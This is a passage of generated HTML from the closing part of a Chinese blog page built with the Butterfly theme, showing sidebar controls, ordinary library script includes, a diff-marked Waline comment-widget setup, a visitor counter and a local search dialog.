fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+
+  const initWaline = (Fn) => {
+    const waline = Fn(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://blog-waline-weld.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+
+    const destroyWaline = () => {
+      waline.destroy()
+    }
+
+    btf.addGlobalFn('pjax', destroyWaline, 'destroyWaline')
+  }
+
+  const loadWaline = async () => {
+    if (initFn) initWaline(initFn)
+    else {
+      await getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.css')
+      const { init } = await import('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.js')
+      initFn = init || Waline.init
+      initWaline(initFn)
+      window.walineFn = initFn
+    }
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
